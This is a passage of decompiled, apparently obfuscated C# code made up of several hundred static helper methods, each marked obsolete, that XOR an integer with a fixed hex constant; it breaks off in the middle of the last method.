	[Obsolete("Exclude")]
	public static int smethod_3872(int int_4)
	{
		return int_4 ^ 0x62C6E74C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3873(int int_4)
	{
		return int_4 ^ 0x476C5125;
	}

	[Obsolete("Exclude")]
	public static int smethod_3874(int int_4)
	{
		return int_4 ^ 0x5578E289;
	}

	[Obsolete("Exclude")]
	public static int smethod_3875(int int_4)
	{
		return int_4 ^ 0x40BDB2FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3876(int int_4)
	{
		return int_4 ^ 0x343417E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3877(int int_4)
	{
		return int_4 ^ 0x7BD14821;
	}

	[Obsolete("Exclude")]
	public static int smethod_3878(int int_4)
	{
		return int_4 ^ 0x6804D47F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3879(int int_4)
	{
		return int_4 ^ 0x7F7C940C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3880(int int_4)
	{
		return int_4 ^ 0x233EB681;
	}

	[Obsolete("Exclude")]
	public static int smethod_3881(int int_4)
	{
		return int_4 ^ 0x21462ACA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3882(int int_4)
	{
		return int_4 ^ 0x37648947;
	}

	[Obsolete("Exclude")]
	public static int smethod_3883(int int_4)
	{
		return int_4 ^ 0x5D8199C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3884(int int_4)
	{
		return int_4 ^ 0xF5375AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3885(int int_4)
	{
		return int_4 ^ 0x6367CFE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3886(int int_4)
	{
		return int_4 ^ 0x8A899A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3887(int int_4)
	{
		return int_4 ^ 0x3D626EB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3888(int int_4)
	{
		return int_4 ^ 0x1541F419;
	}

	[Obsolete("Exclude")]
	public static int smethod_3889(int int_4)
	{
		return int_4 ^ 0x5E7AC209;
	}

	[Obsolete("Exclude")]
	public static int smethod_3890(int int_4)
	{
		return int_4 ^ 0x6CF3E47B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3891(int int_4)
	{
		return int_4 ^ 0x15BEC593;
	}

	[Obsolete("Exclude")]
	public static int smethod_3892(int int_4)
	{
		return int_4 ^ 0x2BC0FE01;
	}

	[Obsolete("Exclude")]
	public static int smethod_3893(int int_4)
	{
		return int_4 ^ 0x232E5B94;
	}

	[Obsolete("Exclude")]
	public static int smethod_3894(int int_4)
	{
		return int_4 ^ 0x7717E2B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3895(int int_4)
	{
		return int_4 ^ 0xD115968;
	}

	[Obsolete("Exclude")]
	public static int smethod_3896(int int_4)
	{
		return int_4 ^ 0x562576A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3897(int int_4)
	{
		return int_4 ^ 0x7924662;
	}

	[Obsolete("Exclude")]
	public static int smethod_3898(int int_4)
	{
		return int_4 ^ 0xC5BCBFD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3899(int int_4)
	{
		return int_4 ^ 0x543AC7F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3900(int int_4)
	{
		return int_4 ^ 0x6DCE1FBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3901(int int_4)
	{
		return int_4 ^ 0x42043D99;
	}

	[Obsolete("Exclude")]
	public static int smethod_3902(int int_4)
	{
		return int_4 ^ 0x72C547F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3903(int int_4)
	{
		return int_4 ^ 0x3A23EF7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3904(int int_4)
	{
		return int_4 ^ 0xA8B673C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3905(int int_4)
	{
		return int_4 ^ 0x16C40177;
	}

	[Obsolete("Exclude")]
	public static int smethod_3906(int int_4)
	{
		return int_4 ^ 0x1DE19AEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3907(int int_4)
	{
		return int_4 ^ 0x1D864079;
	}

	[Obsolete("Exclude")]
	public static int smethod_3908(int int_4)
	{
		return int_4 ^ 0x79143C41;
	}

	[Obsolete("Exclude")]
	public static int smethod_3909(int int_4)
	{
		return int_4 ^ 0x6D182E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3910(int int_4)
	{
		return int_4 ^ 0x14B75334;
	}

	[Obsolete("Exclude")]
	public static int smethod_3911(int int_4)
	{
		return int_4 ^ 0x3EB0A6ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_3912(int int_4)
	{
		return int_4 ^ 0x4231715D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3913(int int_4)
	{
		return int_4 ^ 0x71FB511E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3914(int int_4)
	{
		return int_4 ^ 0x543F6733;
	}

	[Obsolete("Exclude")]
	public static int smethod_3915(int int_4)
	{
		return int_4 ^ 0x37053EC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3916(int int_4)
	{
		return int_4 ^ 0x733B9FE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3917(int int_4)
	{
		return int_4 ^ 0x4DCC39C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3918(int int_4)
	{
		return int_4 ^ 0x70F0053C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3919(int int_4)
	{
		return int_4 ^ 0x4B4E3AED;
	}

	[Obsolete("Exclude")]
	public static int smethod_3920(int int_4)
	{
		return int_4 ^ 0x7A969053;
	}

	[Obsolete("Exclude")]
	public static int smethod_3921(int int_4)
	{
		return int_4 ^ 0xD0EDCBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3922(int int_4)
	{
		return int_4 ^ 0x32B99822;
	}

	[Obsolete("Exclude")]
	public static int smethod_3923(int int_4)
	{
		return int_4 ^ 0x27E743A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3924(int int_4)
	{
		return int_4 ^ 0x22883656;
	}

	[Obsolete("Exclude")]
	public static int smethod_3925(int int_4)
	{
		return int_4 ^ 0x347AE74D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3926(int int_4)
	{
		return int_4 ^ 0x2BCB23BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3927(int int_4)
	{
		return int_4 ^ 0x8AD70B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3928(int int_4)
	{
		return int_4 ^ 0x1768987D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3929(int int_4)
	{
		return int_4 ^ 0x70A445A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3930(int int_4)
	{
		return int_4 ^ 0x5A884FD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3931(int int_4)
	{
		return int_4 ^ 0x55C023EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3932(int int_4)
	{
		return int_4 ^ 0x26684949;
	}

	[Obsolete("Exclude")]
	public static int smethod_3933(int int_4)
	{
		return int_4 ^ 0x641501BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3934(int int_4)
	{
		return int_4 ^ 0x5D21F1E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3935(int int_4)
	{
		return int_4 ^ 0x5B6B0B3F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3936(int int_4)
	{
		return int_4 ^ 0x376EAFBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3937(int int_4)
	{
		return int_4 ^ 0x65C6BED;
	}

	[Obsolete("Exclude")]
	public static int smethod_3938(int int_4)
	{
		return int_4 ^ 0x6E8D013C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3939(int int_4)
	{
		return int_4 ^ 0x7303BA9B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3940(int int_4)
	{
		return int_4 ^ 0x640CFD84;
	}

	[Obsolete("Exclude")]
	public static int smethod_3941(int int_4)
	{
		return int_4 ^ 0x939E9B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3942(int int_4)
	{
		return int_4 ^ 0x1E03F9E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3943(int int_4)
	{
		return int_4 ^ 0x7562D85;
	}

	[Obsolete("Exclude")]
	public static int smethod_3944(int int_4)
	{
		return int_4 ^ 0xC7AFDD2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3945(int int_4)
	{
		return int_4 ^ 0x450834BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3946(int int_4)
	{
		return int_4 ^ 0x24DDAA6B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3947(int int_4)
	{
		return int_4 ^ 0x421F1FA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3948(int int_4)
	{
		return int_4 ^ 0x6390241F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3949(int int_4)
	{
		return int_4 ^ 0x41CED43B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3950(int int_4)
	{
		return int_4 ^ 0x29EF03A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3951(int int_4)
	{
		return int_4 ^ 0x1EA6D269;
	}

	[Obsolete("Exclude")]
	public static int smethod_3952(int int_4)
	{
		return int_4 ^ 0x1A744B62;
	}

	[Obsolete("Exclude")]
	public static int smethod_3953(int int_4)
	{
		return int_4 ^ 0x3D62F2C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3954(int int_4)
	{
		return int_4 ^ 0x509F6D72;
	}

	[Obsolete("Exclude")]
	public static int smethod_3955(int int_4)
	{
		return int_4 ^ 0x494786A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3956(int int_4)
	{
		return int_4 ^ 0x6BBA0543;
	}

	[Obsolete("Exclude")]
	public static int smethod_3957(int int_4)
	{
		return int_4 ^ 0x5249BBCE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3958(int int_4)
	{
		return int_4 ^ 0x7745E2DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3959(int int_4)
	{
		return int_4 ^ 0x165967A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3960(int int_4)
	{
		return int_4 ^ 0x2B797DD8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3961(int int_4)
	{
		return int_4 ^ 0x19572595;
	}

	[Obsolete("Exclude")]
	public static int smethod_3962(int int_4)
	{
		return int_4 ^ 0x13E73C3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3963(int int_4)
	{
		return int_4 ^ 0x484D6C9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3964(int int_4)
	{
		return int_4 ^ 0x6B1B307F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3965(int int_4)
	{
		return int_4 ^ 0x5218D5E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3966(int int_4)
	{
		return int_4 ^ 0x3310395A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3967(int int_4)
	{
		return int_4 ^ 0x5614C14C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3968(int int_4)
	{
		return int_4 ^ 0x21ABBDDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3969(int int_4)
	{
		return int_4 ^ 0x4B67E85E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3970(int int_4)
	{
		return int_4 ^ 0xBA20741;
	}

	[Obsolete("Exclude")]
	public static int smethod_3971(int int_4)
	{
		return int_4 ^ 0x3D4938B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3972(int int_4)
	{
		return int_4 ^ 0x22C092EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3973(int int_4)
	{
		return int_4 ^ 0x15E1077C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3974(int int_4)
	{
		return int_4 ^ 0x61238F2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3975(int int_4)
	{
		return int_4 ^ 0x1124F241;
	}

	[Obsolete("Exclude")]
	public static int smethod_3976(int int_4)
	{
		return int_4 ^ 0x50C75CCE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3977(int int_4)
	{
		return int_4 ^ 0xC53B1D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3978(int int_4)
	{
		return int_4 ^ 0x56374868;
	}

	[Obsolete("Exclude")]
	public static int smethod_3979(int int_4)
	{
		return int_4 ^ 0x3FC3712F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3980(int int_4)
	{
		return int_4 ^ 0x28DE4BDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3981(int int_4)
	{
		return int_4 ^ 0x77C50605;
	}

	[Obsolete("Exclude")]
	public static int smethod_3982(int int_4)
	{
		return int_4 ^ 0x302C8F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3983(int int_4)
	{
		return int_4 ^ 0x57B74A4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3984(int int_4)
	{
		return int_4 ^ 0x1C84C616;
	}

	[Obsolete("Exclude")]
	public static int smethod_3985(int int_4)
	{
		return int_4 ^ 0x79311E3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3986(int int_4)
	{
		return int_4 ^ 0x5A116F5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3987(int int_4)
	{
		return int_4 ^ 0x27BC061B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3988(int int_4)
	{
		return int_4 ^ 0x763397BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3989(int int_4)
	{
		return int_4 ^ 0x304B1246;
	}

	[Obsolete("Exclude")]
	public static int smethod_3990(int int_4)
	{
		return int_4 ^ 0x1DA877A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3991(int int_4)
	{
		return int_4 ^ 0x1C2D251F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3992(int int_4)
	{
		return int_4 ^ 0xDB6CDC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3993(int int_4)
	{
		return int_4 ^ 0x6346D9BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3994(int int_4)
	{
		return int_4 ^ 0x144577F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3995(int int_4)
	{
		return int_4 ^ 0x4CF67EFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3996(int int_4)
	{
		return int_4 ^ 0x7B2128CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3997(int int_4)
	{
		return int_4 ^ 0x4D61D3C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3998(int int_4)
	{
		return int_4 ^ 0x38E57AAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3999(int int_4)
	{
		return int_4 ^ 0x168EE8F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4000(int int_4)
	{
		return int_4 ^ 0x1EFD1B18;
	}

	[Obsolete("Exclude")]
	public static int smethod_4001(int int_4)
	{
		return int_4 ^ 0x7C055439;
	}

	[Obsolete("Exclude")]
	public static int smethod_4002(int int_4)
	{
		return int_4 ^ 0x49E0A45B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4003(int int_4)
	{
		return int_4 ^ 0x6A3B6BCD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4004(int int_4)
	{
		return int_4 ^ 0x262963F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4005(int int_4)
	{
		return int_4 ^ 0x35EAE2FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4006(int int_4)
	{
		return int_4 ^ 0x5DD9586A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4007(int int_4)
	{
		return int_4 ^ 0x34659C50;
	}

	[Obsolete("Exclude")]
	public static int smethod_4008(int int_4)
	{
		return int_4 ^ 0x5E194098;
	}

	[Obsolete("Exclude")]
	public static int smethod_4009(int int_4)
	{
		return int_4 ^ 0x4393F9C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4010(int int_4)
	{
		return int_4 ^ 0xD530D44;
	}

	[Obsolete("Exclude")]
	public static int smethod_4011(int int_4)
	{
		return int_4 ^ 0x4590FE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4012(int int_4)
	{
		return int_4 ^ 0x2FA991BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4013(int int_4)
	{
		return int_4 ^ 0x29B99090;
	}

	[Obsolete("Exclude")]
	public static int smethod_4014(int int_4)
	{
		return int_4 ^ 0x1D32609E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4015(int int_4)
	{
		return int_4 ^ 0x79318CB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4016(int int_4)
	{
		return int_4 ^ 0x6300EE12;
	}

	[Obsolete("Exclude")]
	public static int smethod_4017(int int_4)
	{
		return int_4 ^ 0x5669B4F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4018(int int_4)
	{
		return int_4 ^ 0x631D6A87;
	}

	[Obsolete("Exclude")]
	public static int smethod_4019(int int_4)
	{
		return int_4 ^ 0x453BACBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4020(int int_4)
	{
		return int_4 ^ 0x158CA8D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4021(int int_4)
	{
		return int_4 ^ 0x73267422;
	}

	[Obsolete("Exclude")]
	public static int smethod_4022(int int_4)
	{
		return int_4 ^ 0x575A3551;
	}

	[Obsolete("Exclude")]
	public static int smethod_4023(int int_4)
	{
		return int_4 ^ 0xB59203F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4024(int int_4)
	{
		return int_4 ^ 0x7018CFDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_4025(int int_4)
	{
		return int_4 ^ 0x3BF850D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4026(int int_4)
	{
		return int_4 ^ 0x761845B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4027(int int_4)
	{
		return int_4 ^ 0x11F88551;
	}

	[Obsolete("Exclude")]
	public static int smethod_4028(int int_4)
	{
		return int_4 ^ 0x43A48F4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4029(int int_4)
	{
		return int_4 ^ 0x2B22AAB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4030(int int_4)
	{
		return int_4 ^ 0x47FAAF38;
	}

	[Obsolete("Exclude")]
	public static int smethod_4031(int int_4)
	{
		return int_4 ^ 0x6051DB0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4032(int int_4)
	{
		return int_4 ^ 0x18B5C912;
	}

	[Obsolete("Exclude")]
	public static int smethod_4033(int int_4)
	{
		return int_4 ^ 0x262E4D47;
	}

	[Obsolete("Exclude")]
	public static int smethod_4034(int int_4)
	{
		return int_4 ^ 0x6928A14B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4035(int int_4)
	{
		return int_4 ^ 0x3DCD4731;
	}

	[Obsolete("Exclude")]
	public static int smethod_4036(int int_4)
	{
		return int_4 ^ 0x68D31987;
	}

	[Obsolete("Exclude")]
	public static int smethod_4037(int int_4)
	{
		return int_4 ^ 0x90AAB32;
	}

	[Obsolete("Exclude")]
	public static int smethod_4038(int int_4)
	{
		return int_4 ^ 0x70CB45F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4039(int int_4)
	{
		return int_4 ^ 0x745A8DEB;
	}

	[Obsolete("Exclude")]
	public static int smethod_4040(int int_4)
	{
		return int_4 ^ 0xF7B19A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4041(int int_4)
	{
		return int_4 ^ 0x68D32066;
	}

	[Obsolete("Exclude")]
	public static int smethod_4042(int int_4)
	{
		return int_4 ^ 0x5832CA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4043(int int_4)
	{
		return int_4 ^ 0x41AE170F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4044(int int_4)
	{
		return int_4 ^ 0x3B300241;
	}

	[Obsolete("Exclude")]
	public static int smethod_4045(int int_4)
	{
		return int_4 ^ 0x61A05F85;
	}

	[Obsolete("Exclude")]
	public static int smethod_4046(int int_4)
	{
		return int_4 ^ 0x5CA4C27A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4047(int int_4)
	{
		return int_4 ^ 0x4C81FCAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4048(int int_4)
	{
		return int_4 ^ 0x2FAC0C0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4049(int int_4)
	{
		return int_4 ^ 0x37826BBF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4050(int int_4)
	{
		return int_4 ^ 0x7D1CB507;
	}

	[Obsolete("Exclude")]
	public static int smethod_4051(int int_4)
	{
		return int_4 ^ 0x5851BBD6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4052(int int_4)
	{
		return int_4 ^ 0x6942217B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4053(int int_4)
	{
		return int_4 ^ 0x6C54F18D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4054(int int_4)
	{
		return int_4 ^ 0x7CCB7A64;
	}

	[Obsolete("Exclude")]
	public static int smethod_4055(int int_4)
	{
		return int_4 ^ 0x7815BAE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4056(int int_4)
	{
		return int_4 ^ 0x63239835;
	}

	[Obsolete("Exclude")]
	public static int smethod_4057(int int_4)
	{
		return int_4 ^ 0x51A508F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_4058(int int_4)
	{
		return int_4 ^ 0x71284B19;
	}

	[Obsolete("Exclude")]
	public static int smethod_4059(int int_4)
	{
		return int_4 ^ 0x76128FED;
	}

	[Obsolete("Exclude")]
	public static int smethod_4060(int int_4)
	{
		return int_4 ^ 0x59736C02;
	}

	[Obsolete("Exclude")]
	public static int smethod_4061(int int_4)
	{
		return int_4 ^ 0x720B91CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4062(int int_4)
	{
		return int_4 ^ 0x4A5DD818;
	}

	[Obsolete("Exclude")]
	public static int smethod_4063(int int_4)
	{
		return int_4 ^ 0x76BD7CBC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4064(int int_4)
	{
		return int_4 ^ 0x2789FAF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4065(int int_4)
	{
		return int_4 ^ 0x30745B13;
	}

	[Obsolete("Exclude")]
	public static int smethod_4066(int int_4)
	{
		return int_4 ^ 0x319AC1D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4068(int int_4)
	{
		return int_4 ^ 0x251AFAEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4069(int int_4)
	{
		return int_4 ^ 0x7A097A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4070(int int_4)
	{
		return int_4 ^ 0x5B066FA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4071(int int_4)
	{
		return int_4 ^ 0x6E59663B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4072(int int_4)
	{
		return int_4 ^ 0x7030D076;
	}

	[Obsolete("Exclude")]
	public static int smethod_4073(int int_4)
	{
		return int_4 ^ 0x177C65E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4074(int int_4)
	{
		return int_4 ^ 0x661DEDF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4075(int int_4)
	{
		return int_4 ^ 0x6DEF745B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4076(int int_4)
	{
		return int_4 ^ 0xA8B4E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_4077(int int_4)
	{
		return int_4 ^ 0x147A5BAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4078(int int_4)
	{
		return int_4 ^ 0x569CCDAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4079(int int_4)
	{
		return int_4 ^ 0x24929FD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_4080(int int_4)
	{
		return int_4 ^ 0x53F8655E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4081(int int_4)
	{
		return int_4 ^ 0x67F5734C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4082(int int_4)
	{
		return int_4 ^ 0x226FFA64;
	}

	[Obsolete("Exclude")]
	public static int smethod_4083(int int_4)
	{
		return int_4 ^ 0x5F4B04F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4084(int int_4)
	{
		return int_4 ^ 0x7E7F6E19;
	}

	[Obsolete("Exclude")]
	public static int smethod_4085(int int_4)
	{
		return int_4 ^ 0x29FFDD69;
	}

	[Obsolete("Exclude")]
	public static int smethod_4086(int int_4)
	{
		return int_4 ^ 0x342FD979;
	}

	[Obsolete("Exclude")]
	public static int smethod_4087(int int_4)
	{
		return int_4 ^ 0xBE8E15A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4088(int int_4)
	{
		return int_4 ^ 0x4B614FF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4089(int int_4)
	{
		return int_4 ^ 0x5064A7C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_4090(int int_4)
	{
		return int_4 ^ 0x6A58A2AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_4091(int int_4)
	{
		return int_4 ^ 0x3BBAC884;
	}

	[Obsolete("Exclude")]
	public static int smethod_4092(int int_4)
	{
		return int_4 ^ 0x49579BDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_4093(int int_4)
	{
		return int_4 ^ 0x787F94E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_4094(int int_4)
	{
		return int_4 ^ 0x603B69B;
	}

	[Obsolete("Exclude")]
	public static int smethod_4095(int int_4)
	{
		return int_4 ^ 0x5A83EA99;
	}

	[Obsolete("Exclude")]
	public static int smethod_4096(int int_4)
	{
		return int_4 ^ 0x10418EAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4097(int int_4)
	{
		return int_4 ^ 0x97ED8;
	}

	[Obsolete("Exclude")]
	public static int smethod_4098(int int_4)
	{
		return int_4 ^ 0x68437035;
	}

	[Obsolete("Exclude")]
	public static int smethod_4099(int int_4)
	{
		return int_4 ^ 0x7C14E540;
	}

	[Obsolete("Exclude")]
	public static int smethod_4100(int int_4)
	{
		return int_4 ^ 0x34021471;
	}

	[Obsolete("Exclude")]
	public static int smethod_4101(int int_4)
	{
		return int_4 ^ 0x877A0D4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4102(int int_4)
	{
		return int_4 ^ 0x5F5AF103;
	}

	[Obsolete("Exclude")]
	public static int smethod_4103(int int_4)
	{
		return int_4 ^ 0x6837B9B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4104(int int_4)
	{
		return int_4 ^ 0x3F5B93CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_4105(int int_4)
	{
		return int_4 ^ 0x10AE9749;
	}

	[Obsolete("Exclude")]
	public static int smethod_4106(int int_4)
	{
		return int_4 ^ 0x64D55718;
	}

	[Obsolete("Exclude")]
	public static int smethod_4107(int int_4)
	{
		return int_4 ^ 0xFECD10D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4108(int int_4)
	{
		return int_4 ^ 0x763CCF32;
	}

	[Obsolete("Exclude")]
	public static int smethod_4109(int int_4)
	{
		return int_4 ^ 0x20CB99D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4110(int int_4)
	{
		return int_4 ^ 0x39700B4F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4111(int int_4)
	{
		return int_4 ^ 0x6A95634;
	}

	[Obsolete("Exclude")]
	public static int smethod_4112(int int_4)
	{
		return int_4 ^ 0x14145FB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4113(int int_4)
	{
		return int_4 ^ 0x32E0FC6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_4114(int int_4)
	{
		return int_4 ^ 0x10A33C9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4115(int int_4)
	{
		return int_4 ^ 0x105D400C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4116(int int_4)
	{
		return int_4 ^ 0x2436365C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4117(int int_4)
	{
		return int_4 ^ 0x42197C96;
	}

	[Obsolete("Exclude")]
	public static int smethod_4118(int int_4)
	{
		return int_4 ^ 0x237D1863;
	}

	[Obsolete("Exclude")]
	public static int smethod_4119(int int_4)
	{
		return int_4 ^ 0x5C8E9A4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4120(int int_4)
	{
		return int_4 ^ 0x1DD36E5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_4121(int int_4)
	{
		return int_4 ^ 0x25F94AD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_4122(int int_4)
	{
		return int_4 ^ 0x1196B19C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4123(int int_4)
	{
		return int_4 ^ 0x269F4AB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_4124(int int_4)
	{
		return int_4 ^ 0x46B3F4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4125(int int_4)
	{
		return int_4 ^ 0x49051D76;
	}

	[Obsolete("Exclude")]
	public static int smethod_4126(int int_4)
	{
		return int_4 ^ 0x2364013F;
	}

	[Obsolete("Exclude")]
	public static int smethod_4127(int int_4)
	{
		return int_4 ^ 0x6F84526D;
	}

	[Obsolete("Exclude")]
	public static int smethod_4128(int int_4)
	{
		return int_4 ^ 0x2A7BAB37;
	}

	[Obsolete("Exclude")]
	public static int smethod_4129(int int_4)
	{
		return int_4 ^ 0x4C9C94C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_4130(int int_4)
	{
		return int_4 ^ 0x17433114;
	}

	[Obsolete("Exclude")]
	public static int smethod_4131(int int_4)
	{
		return int_4 ^ 0x46FFF49C;
	}

	[Obsolete("Exclude")]
	public static int smethod_4132(int int_4)
	{
		return int_4 ^ 0x16AD37D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_4133(int int_4)
	{
		return int_4 ^ 0x6BE9671;
	}

	[Obsolete("Exclude")]
	public static int smethod_4134(int int_4)
	{
